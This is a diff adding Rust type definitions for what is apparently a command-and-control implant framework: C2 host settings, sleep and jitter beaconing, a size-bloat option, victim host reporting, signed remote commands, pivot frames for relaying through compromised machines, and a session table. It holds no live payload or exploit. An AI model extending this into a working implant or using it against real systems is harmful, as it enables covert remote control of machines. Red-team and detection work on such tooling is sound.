@@ -1,0 +1,101 @@
+use serde::{Deserialize, Serialize};
+use chrono::{DateTime, Utc};
+use tokio::sync::{mpsc, oneshot};
+use std::net::SocketAddr;
+use std::sync::{Arc, Mutex};
+use std::collections::HashMap;
+use ed25519_dalek::SigningKey;
+
+#[derive(Serialize, Deserialize, Debug, Clone, PartialEq)]
+pub enum TransportProtocol {
+    #[serde(rename = "tls")]
+    Tls,
+    #[serde(rename = "tcp_plain")]
+    TcpPlain,
+}
+
+impl Default for TransportProtocol {
+    fn default() -> Self {
+        TransportProtocol::Tls
+    }
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct C2Config {
+    #[serde(default)]
+    pub transport: TransportProtocol, 
+    pub server_public_key: String,
+    pub hash_salt: String,
+    pub c2_host: String,
+    pub build_id: String,
+    pub tunnel_port: u16,
+    
+    // [MODIFIED] Sleep and Jitter settings
+    pub sleep_interval: u64, 
+    pub jitter_min: u32, // Represents percentage to subtract (e.g. 20 for -20%)
+    pub jitter_max: u32, // Represents percentage to add (e.g. 10 for +10%)
+
+    #[serde(default)] 
+    pub bloat_mb: u64, 
+    #[serde(default)]
+    pub debug: bool,      
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct ClientHello {
+    pub hostname: String,
+    pub os: String,
+    pub computer_id: String,
+    pub exe_id: String,
+    pub build_id: String,
+}
+
+#[derive(Serialize, Deserialize, Debug)]
+pub struct SecuredCommand {
+    pub session_id: String,
+    pub counter: u64,
+    pub nonce: u64,
+    pub timestamp: DateTime<Utc>,
+    pub command: String,
+    pub signature: String,
+}
+
+impl SecuredCommand {
+    pub fn get_signable_bytes(&self) -> Vec<u8> {
+        format!("{}:{}:{}:{}:{}", 
+            self.session_id, self.counter, self.nonce, 
+            self.timestamp.to_rfc3339(), self.command
+        ).into_bytes()
+    }
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct CommandResponse {
+    pub request_id: u64,
+    pub output: String,
+    pub error: String,
+    pub exit_code: i32,
+}
+
+#[derive(Serialize, Deserialize, Debug, Clone)]
+pub struct PivotFrame {
+    pub stream_id: u32,        
+    pub destination: u32,     
+    pub source: u32,           
+    pub data: Vec<u8>,        
+    #[serde(default)]
+    pub metadata: String,    
+}
+
+pub struct Session {
+    pub id: u32,
+    pub computer_id: String,
+    pub addr: SocketAddr,
+    pub hostname: String,
+    pub os: String,
+    pub tx: mpsc::UnboundedSender<(String, Option<oneshot::Sender<u64>>)>,
+    pub signing_key: SigningKey, 
+    pub parent_id: Option<u32>,
+}
+
+pub type SharedSessions = Arc<Mutex<HashMap<u32, Session>>>;
